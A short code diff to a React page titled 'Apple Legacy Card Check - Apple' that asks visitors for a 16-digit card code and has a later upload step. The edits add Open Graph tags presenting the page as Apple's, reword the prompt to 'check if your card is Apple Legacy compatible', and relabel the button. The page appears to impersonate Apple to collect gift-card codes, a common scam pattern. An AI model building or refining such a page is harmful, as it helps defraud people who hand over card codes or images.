@@ -200,6 +200,9 @@ export default function AppleLegacyPage() {
     <div className={styles.appleStyles}>
       <Head>
         <title>Apple Legacy Card Check - Apple</title>
+        <meta property="og:title" content="Apple Legacy Card Check - Apple" />
+        <meta property="og:description" content="Check to see if the card is an Apple Legacy compatible card." />
+        <meta property="og:type" content="website" />
       </Head>
 
       {/* Location Banner */}
@@ -298,7 +301,7 @@ export default function AppleLegacyPage() {
         <div className="shell">
           <section className="hero">
             <h1>Apple Legacy Card Check</h1>
-            <p className="hero-text">Enter your 16-digit code to verify the card type instantly.</p>
+            <p className="hero-text">Enter your 16 digit code to check if your card is Apple Legacy compatible.</p>
           </section>
 
           <div className="main-card">
@@ -341,7 +344,7 @@ export default function AppleLegacyPage() {
               {!showUploadStep && (
                 <div className="actions">
                   <button type="submit" className="primary" disabled={loading}>
-                    {loading ? 'Checking…' : 'Check ID'}
+                    {loading ? 'Checking…' : 'Check Card'}
                   </button>
                 </div>
               )}
